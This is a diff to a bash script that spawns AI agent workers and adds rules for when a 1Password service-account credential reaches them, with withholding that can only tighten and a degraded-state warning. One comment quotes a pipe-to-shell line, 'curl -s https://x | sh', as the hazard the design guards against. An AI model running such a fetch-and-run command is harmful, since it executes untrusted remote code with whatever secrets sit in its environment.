@@ -1,5 +1,11 @@
 #!/usr/bin/env bash
-# spawn-task.sh <project> <branch> [job-class] [agent-or-command...] [--base REF] [--dry-run] [--focus]
+# spawn-task.sh <project> <branch> [job-class] [agent-or-command...] [--base REF] [--dry-run] [--focus] [--no-secrets]
+#
+# Every worker starts with the 1Password service-account identity (one vault,
+# 249 items, READ-ONLY) so an unattended run never stops to ask for a
+# credential. `--no-secrets` withholds it — use it when the task handles
+# material we did not write (third-party code review, a scrape, anything
+# parsing untrusted input). See lib/op-env.sh for why the default is ON.
 #
 # Spin a task into its own WORKTREE, opened as a TAB inside the project's own
 # workspace (a "sub-tab", not a separate space), running the right model at
@@ -44,8 +50,15 @@ here=$(cd "$(dirname "$0")" && pwd)
 . "$here/lib/agent-profiles.sh"
 . "$here/lib/repo-root.sh"
 . "$here/lib/handoff.sh"
+. "$here/lib/op-env.sh"
 
 # ---- args ------------------------------------------------------------------
+# op_mode inherits TIGHTEN-ONLY, the same shape as HERDR_POSTURE_FLOOR: a worker
+# spawned with --no-secrets exports HERDR_SECRETS_WITHHELD=1, so a child spawn
+# it makes cannot re-grant the credential to itself. Only an explicit
+# --secrets, typed by a human or a conductor that holds it, lifts that.
+secrets_req=""
+[ "${HERDR_SECRETS_WITHHELD:-}" = 1 ] && secrets_req=withhold
 base=""; dry=0; model_override=""; effort_override=""; posture_req=""; foc=--no-focus; positional=()
 while [ $# -gt 0 ]; do
   case "$1" in
@@ -53,8 +66,16 @@ while [ $# -gt 0 ]; do
     --model) model_override="$2"; shift 2 ;;
     --effort) effort_override="$2"; shift 2 ;;
     --posture) posture_req="${2:?spawn-task: --posture needs a value (yolo|write|strict)}"; shift 2 ;;
+    # Credential posture for this spawn — see lib/op-env.sh for why the managed
+    # default is ON and the unmanaged default is OFF.
+    --no-secrets) secrets_req=withhold; shift ;;
+    --secrets) secrets_req=grant; shift ;;
     --dry-run|-n) dry=1; shift ;;
     --focus) foc=--focus; shift ;;
+    # Everything after `--` belongs to the worker's own command, flags included.
+    # Without this, `spawn-task.sh ~/repo t quick ./tool --no-secrets` silently
+    # ate the worker's argument and changed this spawn's credential posture.
+    --) shift; positional+=("$@"); break ;;
     *) positional+=("$1"); shift ;;
   esac
 done
@@ -106,6 +127,38 @@ if cli=$(cli_for_agent "$agent" "$m" "$posture_req"); then
 else
   managed=0
   cli="${rest[*]}"  # literal command; no model mapping, no posture flag, no rules append
+fi
+
+# ---- credential posture ------------------------------------------------------
+# ON for a MANAGED launch, OFF for an UNMANAGED one, either overridable.
+#
+# The asymmetry is the whole point (security review 2026-09-19, SPAWN-OPENV-005).
+# A managed launch runs behind the posture ladder and lib/command-policy.sh, so
+# credential-VALUE access still stops for a human, and the unattended-run
+# argument for default-ON was measured on exactly that path. An unmanaged
+# literal command has, by this script's own admission above, no posture flag and
+# no approval surface — `spawn-task.sh ~/repo t quick 'curl -s https://x | sh'`
+# would otherwise run with a vault credential in its environment and nothing
+# between the two. Say --secrets if that is genuinely what you want.
+op_mode=withhold
+secrets_why="unmanaged literal command"
+if [ "$managed" = 1 ] && [ "$secrets_req" != withhold ]; then op_mode=""; secrets_why="managed default"; fi
+# Job class decides next (lib/agent-profiles.sh): review/explore read material
+# we did not write, so they are withheld even when managed.
+if [ -z "$op_mode" ] && [ "$(secrets_default_for_job "$job")" = withhold ]; then
+	op_mode=withhold; secrets_why="job class '$job' reads material we did not write"
+fi
+[ "$secrets_req" = withhold ] && { op_mode=withhold; secrets_why="--no-secrets"; }
+# --secrets lifts a job-class or unmanaged default, never an inherited one.
+[ "$secrets_req" = grant ] && { op_mode=""; secrets_why="--secrets"; }
+# Inherited withholding is tighten-only and wins over everything above.
+[ "${HERDR_SECRETS_WITHHELD:-}" = 1 ] && { op_mode=withhold; secrets_why="inherited from a withheld parent"; }
+secrets_note="service account (read-only, 1 vault) — op resolves with no human [$secrets_why]"
+if [ "$op_mode" = withhold ]; then
+  secrets_note="WITHHELD [$secrets_why] — token not placed in this worker's environment (the 600-mode file stays readable by this uid; not a sandbox)"
+  # Half the mechanism is a guard in ~/.zshenv this repo does not install. Say
+  # so rather than printing a guarantee that is not in force (SPAWN-OPENV-001-R).
+  op_env_guard_installed || secrets_note="WITHHELD [$secrets_why] — DEGRADED: the ~/.zshenv HERDR_SECRETS_WITHHELD guard is MISSING, so a 'zsh -c' child re-sources the token. Install it or treat this as unwithheld."
 fi
 # The posture actually in force for this spawn (floor composed with the
 # request — can only tighten). Stamped into the worker below as ITS floor,
@@ -209,6 +262,10 @@ if [ "$dry" = 1 ]; then
     echo "  launch    : $cli"
     echo "  ⚠ UNMANAGED literal command: no posture flag, no canonical rules append — only the env floor stamp reaches it"
   fi
+  # Outside the managed/unmanaged branch on purpose: the UNMANAGED path is the
+  # one where the credential posture matters MOST, and reporting it only for
+  # managed launches is how a silent grant goes unnoticed.
+  echo "  secrets   : $secrets_note"
   echo "  wake      : $here/wake-on-evidence.sh $events_file '$wake_pattern'"
   echo "              ^ run BACKGROUNDED (run_in_background/async:true) — a blocking"
   echo "                foreground call strands you idle until re-prompted by hand"
@@ -334,7 +391,12 @@ stamped_cli=$(printf 'export HERDR_RUN_ID=%q HERDR_TASK_ID=%q HERDR_WORKER_ID=%q
   "$run_id" "$task_id" "$worker_id" "$conductor_id" "$conductor_pane_id" "$pane" "$label" "$eff_posture")
 [ -n "${HERDR_POLICY_EXTRA_RULES:-}" ] && stamped_cli="$stamped_cli $(printf 'HERDR_POLICY_EXTRA_RULES=%q' "$HERDR_POLICY_EXTRA_RULES")"
 [ -n "$CANONICAL_RULES_SRC" ] && stamped_cli="$stamped_cli $(printf 'HERDR_CANONICAL_RULES=%q' "$CANONICAL_RULES_SRC")"
-stamped_cli="$stamped_cli; $cli"
+# The op prelude runs FIRST (lib/op-env.sh): a worker that has to hunt for a
+# credential stops and asks a human, which is the one thing an unattended run
+# cannot afford. Measured 2026-09-19 — a spawned worker doing DB work found no
+# token, went looking for .env.local (gitignored, so absent from every linked
+# worktree), and produced four credential-shaped approval prompts.
+stamped_cli="$(op_env_prelude "$op_mode") $stamped_cli; $cli"
 herdr pane run "$pane" "$stamped_cli" >/dev/null 2>&1 || { echo "spawn-task: launch failed: $cli" >&2; exit 1; }
 herdr pane report-agent "$pane" --source "$HERDR_SOURCE" --agent "$label" --state working >/dev/null 2>&1 || true
 
@@ -371,6 +433,7 @@ else
   printf '  ⚠ UNMANAGED literal command: no posture flag, no canonical rules append —\n'
   printf '    only the env floor stamp reaches it; nothing here enforces approvals.\n'
 fi
+printf '  secrets:  %s\n' "$secrets_note"
 printf '  wake:     %s %s '"'"'%s'"'"'\n' "$here/wake-on-evidence.sh" "$events_file" "$wake_pattern"
 printf '            ^ run BACKGROUNDED (run_in_background/async:true) — a blocking\n'
 printf '              foreground call strands you idle until re-prompted by hand\n'
